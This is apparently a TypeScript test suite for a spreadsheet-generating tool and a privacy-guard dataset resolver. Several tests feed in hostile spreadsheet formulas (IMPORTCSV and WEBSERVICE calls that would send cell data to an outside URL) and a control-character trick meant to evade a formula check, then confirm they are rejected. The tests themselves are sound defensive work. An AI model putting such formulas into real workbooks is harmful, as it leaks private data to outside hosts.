import { describe, it } from 'node:test';
import { strict as assert } from 'node:assert';
import { Readable } from 'node:stream';
import ExcelJS from 'exceljs';
import type { TigrisStore } from '@omadia/diagrams';
import { createPrivacyGuardService } from '@omadia/plugin-privacy-guard';
import { OfficeService, OfficeTool } from '@omadia/plugin-office';

const SECRET = 'z'.repeat(32);

class InMemoryStore implements TigrisStore {
  private objects = new Map<string, { body: Buffer; contentType?: string }>();
  /** Stored bytes for a key, so a test can open the file the tool produced. */
  read(key: string): Buffer | undefined {
    return this.objects.get(key)?.body;
  }
  get size(): number {
    return this.objects.size;
  }
  exists(key: string): Promise<boolean> {
    return Promise.resolve(this.objects.has(key));
  }
  put(key: string, body: Buffer, contentType?: string): Promise<void> {
    this.objects.set(key, { body, ...(contentType ? { contentType } : {}) });
    return Promise.resolve();
  }
  getStream(key: string): Promise<{
    stream: Readable;
    contentType: string | undefined;
    contentLength: number | undefined;
  }> {
    const obj = this.objects.get(key);
    if (!obj) return Promise.reject(Object.assign(new Error('NoSuchKey'), { name: 'NoSuchKey' }));
    return Promise.resolve({
      stream: Readable.from(obj.body),
      contentType: obj.contentType,
      contentLength: obj.body.byteLength,
    });
  }
}

function makeService(store: TigrisStore = new InMemoryStore()): OfficeService {
  return new OfficeService({
    store,
    secret: SECRET,
    publicBaseUrl: 'https://bot.example.com',
    tenantId: 'dev',
    signedUrlTtlSec: 60,
  });
}

/** Open the workbook a successful `create_xlsx` call stored: the storage key
 *  is the path of the signed URL in the tool result. */
async function loadStoredWorkbook(store: InMemoryStore, toolOutput: string): Promise<ExcelJS.Workbook> {
  const { url } = JSON.parse(toolOutput) as { url: string };
  const key = decodeURIComponent(new URL(url).pathname.replace(/^\/documents\/dl\//, ''));
  const body = store.read(key);
  assert.ok(body, `no stored object under ${key}`);
  const wb = new ExcelJS.Workbook();
  // exceljs declares its own `Buffer extends ArrayBuffer`; same cast as
  // datasetImportXlsx.ts.
  await wb.xlsx.load(body as unknown as ArrayBuffer);
  return wb;
}

// --- B1: privacy-guard resolver --------------------------------------------

describe('privacy-guard resolveDatasetForRender (B1)', () => {
  it('interns rows and resolves the datasetId to full real rows in-turn', async () => {
    const svc = createPrivacyGuardService();
    const turnId = 'turn-1';
    const rows = [
      { partner: 'Acme GmbH', amount: 100 },
      { partner: 'Beta AG', amount: 200 },
    ];
    const interned = await svc.internToolResultV4({
      turnId,
      toolName: 'odoo_fetch_dataset',
      rawResult: JSON.stringify(rows),
    });
    assert.ok(interned.datasetId);

    const resolved = svc.resolveDatasetForRender?.(turnId, interned.datasetId);
    assert.ok(resolved, 'dataset resolves within the turn');
    assert.equal(resolved.rowCount, 2);
    assert.ok(resolved.columns.some((c) => c.path === 'partner'));
    assert.ok(resolved.columns.some((c) => c.path === 'amount'));

    // Unknown id → undefined.
    assert.equal(svc.resolveDatasetForRender?.(turnId, 'does-not-exist'), undefined);

    // After the turn is finalized the store is dropped → no resolution.
    await svc.finalizeTurn(turnId);
    assert.equal(svc.resolveDatasetForRender?.(turnId, interned.datasetId), undefined);
  });
});

// --- B3: office dataset render path -----------------------------------------

describe('office create_xlsx dataset mode (B3)', () => {
  const datasetRows = [
    { partner_id: [42, 'Acme GmbH'], amount_residual: 1234.5, invoice_date: '2026-05-01' },
    { partner_id: [7, 'Beta AG'], amount_residual: 999, invoice_date: '2026-05-02' },
  ];
  const columns = [
    { key: 'partner_id', header: 'Partner', type: 'text' as const },
    { key: 'amount_residual', header: 'Offen', type: 'currency' as const, currency: 'EUR' },
    { key: 'invoice_date', header: 'Datum', type: 'date' as const },
  ];

  it('resolves a datasetId, renders, and passes the rowCount postcondition', async () => {
    const tool = new OfficeTool(makeService(), 100_000, {
      currentTurnId: () => 'turn-x',
      getPrivacyResolver: () => (turnId, datasetId) =>
        turnId === 'turn-x' && datasetId === 'ds1'
          ? {
              rowCount: datasetRows.length,
              columns: [
                { path: 'partner_id', type: 'many2one' },
                { path: 'amount_residual', type: 'monetary' },
                { path: 'invoice_date', type: 'date' },
              ],
              rows: datasetRows,
            }
          : undefined,
    });

    const out = await tool.handleXlsx({
      filename: 'offene-posten',
      sheets: [{ name: 'Offene Posten', columns, datasetId: 'ds1' }],
    });
    const parsed = JSON.parse(out) as { rows: number; filename: string };
    assert.equal(parsed.rows, 2, 'wrote all dataset rows');
    assert.match(parsed.filename, /offene-posten\.xlsx/);

    const drained = tool.drain();
    assert.equal(drained?.length, 1);
    assert.equal(drained[0]?.kind, 'file');
  });

  it('fails the postcondition when fewer rows are written than the dataset rowCount', async () => {
    const tool = new OfficeTool(makeService(), 100_000, {
      currentTurnId: () => 't',
      // rowCount claims 3 but only 2 rows are present → truncation signal.
      getPrivacyResolver: () => () => ({
        rowCount: 3,
        columns: [{ path: 'a', type: 'text' }],
        rows: [{ a: '1' }, { a: '2' }],
      }),
    });
    const out = await tool.handleXlsx({
      sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], datasetId: 'x' }],
    });
    assert.match(out, /postcondition failed — wrote 2 of 3 rows/);
  });

  it('errors clearly when no privacy provider is installed', async () => {
    const tool = new OfficeTool(makeService(), 100_000, {});
    const out = await tool.handleXlsx({
      sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], datasetId: 'x' }],
    });
    assert.match(out, /dataset rendering is unavailable/);
  });

  it('rejects a sheet that supplies both rows and datasetId', async () => {
    const tool = new OfficeTool(makeService(), 100_000, {
      currentTurnId: () => 't',
      getPrivacyResolver: () => () => undefined,
    });
    const out = await tool.handleXlsx({
      sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: 1 }], datasetId: 'x' }],
    });
    assert.match(out, /invalid create_xlsx input/);
  });

  it('still renders an inline sheet (M1 unaffected)', async () => {
    const tool = new OfficeTool(makeService(), 100_000, {});
    const out = await tool.handleXlsx({
      sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: 1 }, { a: 2 }] }],
    });
    const parsed = JSON.parse(out) as { rows: number };
    assert.equal(parsed.rows, 2);
  });

  it('writes a dataset cell shaped like a formula object as text, never as a formula', async () => {
    // Resolved dataset rows are data, not descriptors: an object value is
    // JSON-stringified, so a system of record can never inject a formula or a
    // cached result into the workbook.
    const store = new InMemoryStore();
    const tool = new OfficeTool(makeService(store), 100_000, {
      currentTurnId: () => 't',
      getPrivacyResolver: () => () => ({
        rowCount: 1,
        columns: [{ path: 'a', type: 'text' }],
        rows: [{ a: { formula: '1+1', result: 999 } }],
      }),
    });
    const out = await tool.handleXlsx({
      sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], datasetId: 'x' }],
    });
    const wb = await loadStoredWorkbook(store, out);
    assert.equal(wb.getWorksheet('S')?.getCell('A2').value, '{"formula":"1+1","result":999}');
  });

  it('refuses a computed column that would send every dataset row out, and stores nothing', async () => {
    // The rows behind a datasetId never reach the model, but a computed
    // column is model-authored: it must not carry them to a URL either.
    const store = new InMemoryStore();
    const tool = new OfficeTool(makeService(store), 100_000, {
      currentTurnId: () => 't',
      getPrivacyResolver: () => () => ({
        rowCount: 2,
        columns: [{ path: 'partner', type: 'text' }],
        rows: [{ partner: 'Acme GmbH' }, { partner: 'Beta AG' }],
      }),
      log: () => undefined,
    });
    const out = await tool.handleXlsx({
      sheets: [
        {
          name: 'S',
          columns: [
            { key: 'partner', header: 'Partner' },
            {
              key: 'lookup',
              header: 'Lookup',
              formula: 'IMPORTCSV("https://example.invalid/c?q="&ENCODEURL(A{row}))',
            },
          ],
          datasetId: 'x',
        },
      ],
    });
    assert.match(out, /^Error: formula in sheet "S", computed column "lookup" rejected: .*IMPORTCSV/);
    assert.equal(tool.drain(), undefined, 'no attachment is produced');
    assert.equal(store.size, 0, 'nothing is stored');
  });

  it('refuses a computed column whose text the file would not store as checked', async () => {
    // exceljs drops this control character on the way into the file, so the
    // check would read two names (IMPORT, TEXT) where the file holds one.
    // The schema refuses it before the dataset is even resolved.
    const store = new InMemoryStore();
    let resolved = false;
    const tool = new OfficeTool(makeService(store), 100_000, {
      currentTurnId: () => 't',
      getPrivacyResolver: () => () => {
        resolved = true;
        return { rowCount: 1, columns: [{ path: 'partner', type: 'text' }], rows: [{ partner: 'Acme GmbH' }] };
      },
      log: () => undefined,
    });
    const out = await tool.handleXlsx({
      sheets: [
        {
          name: 'S',
          columns: [
            { key: 'partner', header: 'Partner' },
            { key: 'lookup', header: 'Lookup', formula: 'IMPORT\u0001TEXT(A{row})' },
          ],
          datasetId: 'x',
        },
      ],
    });
    assert.match(
      out,
      /^Error: invalid create_xlsx input — sheets\.0\.columns\.1\.formula: rejected: it contains the control character U\+0001,/,
    );
    assert.equal(resolved, false, 'the dataset is never resolved');
    assert.equal(tool.drain(), undefined, 'no attachment is produced');
    assert.equal(store.size, 0, 'nothing is stored');
  });
});

describe('office create_xlsx formula cells', () => {
  it('drops a model-supplied cached result on the way to the stored file', async () => {
    const store = new InMemoryStore();
    const tool = new OfficeTool(makeService(store), 100_000, {});
    const out = await tool.handleXlsx({
      sheets: [
        {
          name: 'S',
          columns: [{ key: 'a', header: 'A', type: 'number' }],
          rows: [{ a: { formula: '1+1', result: 999 } }],
        },
      ],
    });
    const wb = await loadStoredWorkbook(store, out);
    const value = wb.getWorksheet('S')?.getCell('A2').value as
      | { formula?: string; result?: unknown }
      | undefined;
    assert.equal(value?.formula, '1+1', 'the formula itself is kept');
    assert.equal(value?.result, undefined, 'no cached value reaches the file');
  });

  it('refuses a formula that reaches outside the workbook and stores nothing', async () => {
    const store = new InMemoryStore();
    const tool = new OfficeTool(makeService(store), 100_000, { log: () => undefined });
    const out = await tool.handleXlsx({
      sheets: [
        {
          name: 'S',
          columns: [{ key: 'a', header: 'A' }],
          rows: [{ a: { formula: 'WEBSERVICE("https://example.invalid/?q="&B1)' } }],
        },
      ],
    });
    assert.match(out, /^Error: formula in sheet "S", cell A2 rejected: .*WEBSERVICE/);
    assert.equal(tool.drain(), undefined, 'no attachment is produced');
    assert.equal(store.size, 0, 'nothing is stored');
  });
});
